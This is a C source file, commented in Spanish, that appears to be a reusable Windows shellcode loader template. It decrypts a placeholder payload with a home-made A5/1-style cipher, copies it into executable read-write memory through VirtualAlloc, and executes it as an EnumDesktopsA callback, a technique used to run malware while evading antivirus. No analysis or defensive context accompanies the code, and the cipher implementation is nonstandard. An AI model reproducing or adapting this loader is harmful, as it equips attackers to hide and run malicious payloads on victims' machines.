#include "lol.h"


/*declaraciones */


int main()
{
unsigned char llave[] = { 0x5f, 0x23, 0x2f, 0x76, 0x77, 0x5f, 0x2f, 0x65 };

unsigned char mensaje[] = { 0x00,0x00 };

int llave_l = sizeof(llave);

int payl_l = sizeof(mensaje);
int padlen = payl_l + (8 - payl_l % 8) % 8;

unsigned char padded[padlen];


memcpy(padded, mensaje, payl_l);
memset(padded + payl_l, 0x90, padlen - payl_l);
    unsigned char encriptado[padlen];
    a5_1_encrypt(llave, llave_l, padded, padlen, encriptado);
    unsigned char desencriptado[padlen];
    a5_1_decrypt(llave, llave_l, encriptado, padlen, desencriptado);
    //BASE DEL Programa moldeable

    LPVOID mem = VirtualAlloc(NULL, payl_l, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, desencriptado, payl_l);
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
    return 0;
}

void a5_1_encrypt(unsigned char* key, int key_len, unsigned char* msg, int msg_len, unsigned char* out)
{
    unsigned int R1 = 0, R2 = 0, R3 = 0;
    for (int i = 0; i < 64; i++) {
        int feedback = ((key[i % key_len] >> (i / 8)) & 1) ^ ((R1 >> 18) & 1) ^ ((R2 >> 21) & 1) ^ ((R3 >> 22) & 1);
        R1 = (R1 << 1) | feedback;
        R2 = (R2 << 1) | ((R1 >> 8) & 1);
        R3 = (R3 << 1) | ((R2 >> 10) & 1);
    }
    for (int i = 0; i < msg_len; i++) {
        int feedback = A5_STEP((R1 >> 8) & 1, (R2 >> 10) & 1, (R3 >> 10) & 1);
        unsigned char key_byte = 0;
        for (int j = 0; j < 8; j++) {
            int bit = A5_STEP((R1 >> 18) & 1, (R2 >> 21) & 1, (R3 >> 22) & 1) ^ feedback;
            key_byte |= bit << j;
            R1 = (R1 << 1) | bit;
            R2 = (R2 << 1) | ((R1 >> 8) & 1);
            R3 = (R3 << 1) | ((R2 >> 10) & 1);
        }
        out[i] = msg[i] ^ key_byte;
    }
}

void a5_1_decrypt(unsigned char* key, int key_len, unsigned char* cipher, int cipher_len, unsigned char* out) {

    unsigned int R1 = 0, R2 = 0, R3 = 0;
    for (int i = 0; i < 64; i++) {
        int feedback = ((key[i % key_len] >> (i / 8)) & 1) ^ ((R1 >> 18) & 1) ^ ((R2 >> 21) & 1) ^ ((R3 >> 22) & 1);
        R1 = (R1 << 1) | feedback;
        R2 = (R2 << 1) | ((R1 >> 8) & 1);
        R3 = (R3 << 1) | ((R2 >> 10) & 1);
    }

    for (int i = 0; i < cipher_len; i++) {
        int feedback = A5_STEP((R1 >> 8) & 1, (R2 >> 10) & 1, (R3 >> 10) & 1);
        unsigned char key_byte = 0;
        for (int j = 0; j < 8; j++) {
            int bit = A5_STEP((R1 >> 18) & 1, (R2 >> 21) & 1, (R3 >> 22) & 1) ^ feedback;
            key_byte |= bit << j;
            R1 = (R1 << 1) | bit;
            R2 = (R2 << 1) | ((R1 >> 8) & 1);
            R3 = (R3 << 1) | ((R2 >> 10) & 1);
        }
        out[i] = cipher[i] ^ key_byte;
    }
}

